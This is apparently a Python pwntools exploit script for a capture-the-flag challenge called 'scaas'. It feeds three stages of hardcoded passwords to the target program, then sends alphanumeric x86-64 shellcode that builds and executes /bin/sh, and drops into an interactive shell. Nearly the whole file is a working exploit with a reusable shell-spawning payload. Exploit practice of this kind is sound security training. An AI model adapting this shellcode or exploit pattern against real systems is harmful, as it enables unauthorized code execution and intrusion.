from pwn import *

p = process("./scaas")
gdb.attach(p)
#p = remote("scaas-1.play.hfsc.tf", 1337)

p.recvuntil(b">")
p.sendline(b"2")

p.recvuntil(b"Stage 1")
stage1 = [9530624, 7370775, 1234, 8653762, 8987274]

for i in range(5):
    p.recvuntil(f"Enter password {i}:".encode())
    p.sendline(str(stage1[i]).encode())

stage2 = [1243932, 3103430, 262049, 262505, 695]

p.recvuntil(b"Stage 2")
for i in range(5):
    p.recvuntil(f"Enter password {i}:".encode())
    p.sendline(str(stage2[i]).encode())

stage3 = [2124890, 9874561, 6288407, 6280405, 0]

p.recvuntil(b"Stage 3")
for i in range(5):
    p.recvuntil(f"Enter password {i}:".encode())
    p.sendline(str(stage3[i]).encode())

# payload = b"j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4ADDDDDDDDDDDDDDDD"
payload = b"\x6a\x30\x58\x34\x30\x50\x5a\x48\x66\x35\x41\x30\x66\x35\x73\x4f\x50\x52\x58\x684J4A\x68PSTY\x68UVWa\x68QRPT\x68PTXR\x68binH\x68IQ50\x68shDY\x68Rha0"         
p.recvuntil(b"500 bytes):")
p.sendline(payload)

p.interactive()